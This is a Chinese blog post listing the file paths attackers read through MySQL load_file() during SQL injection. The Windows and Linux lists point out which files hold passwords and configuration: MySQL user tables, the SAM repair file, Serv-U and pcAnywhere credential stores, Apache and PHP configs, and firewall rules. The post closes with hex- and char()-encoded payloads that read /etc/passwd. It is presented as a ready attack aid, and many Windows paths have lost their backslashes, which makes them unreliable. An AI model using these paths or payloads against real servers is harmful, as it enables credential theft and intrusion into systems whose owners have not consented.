---
date: 2013-12-23 05:42:08+00:00
title: MySQL注入load_file常用路径
categories:
- web安全
---

网上收集了一些关于mysql注入中常见的load_file路径，共享给兄弟们。





### WINDOWS下:




c:/boot.ini //查看系统版本




c:/windows/php.ini //php配置信息




c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码




c:/winnt/php.ini




c:/winnt/my.ini




c:mysqldatamysqluser.MYD //存储了mysql.user表中的数据库连接密码




c:Program FilesRhinoSoft.comServ-UServUDaemon.ini //存储了虚拟主机网站路径和密码




c:Program FilesServ-UServUDaemon.ini




c:windowssystem32inetsrvMetaBase.xml 查看IIS的虚拟主机配置




c:windowsrepairsam //存储了WINDOWS系统初次安装的密码




c:Program Files Serv-UServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此




c:Program FilesRhinoSoft.comServUDaemon.exe




C:Documents and SettingsAll UsersApplication DataSymantecpcAnywhere*.cif文件




//存储了pcAnywhere的登陆密码




c:Program FilesApache GroupApacheconfhttpd.conf 或C:apacheconfhttpd.conf //查看WINDOWS系统apache文件




c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.




c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机




d:APACHEApache2confhttpd.conf




C:Program Filesmysqlmy.ini




C:mysqldatamysqluser.MYD 存在MYSQL系统中的用户密码





### LUNIX/UNIX 下:




/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件




/usr/local/apache2/conf/httpd.conf




/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置




/usr/local/app/php5/lib/php.ini //PHP相关设置




/etc/sysconfig/iptables //从中得到防火墙规则策略




/etc/httpd/conf/httpd.conf // apache配置文件




/etc/rsyncd.conf //同步程序配置文件




/etc/my.cnf //mysql的配置文件




/etc/redhat-release //系统版本




/etc/issue




/etc/issue.net




/usr/local/app/php5/lib/php.ini //PHP相关设置




/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置




/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件




/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看




/usr/local/resin-pro-3.0.22/conf/resin.conf 同上




/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看




/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件




/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看




/usr/local/resin-pro-3.0.22/conf/resin.conf 同上




/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看




/etc/sysconfig/iptables 查看防火墙策略




load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录




replace(load_file(0×2F6574632F706173737764),0×3c,0×20)




replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))




原文地址：http://hi.baidu.com/sethc5/item/ec2891959d94a6a9cc80e561?qq-pf-to=pcqq.group




[http://www.waitalone.cn/mysql-injection-load_file-common-path.html](http://www.waitalone.cn/mysql-injection-load_file-common-path.html)
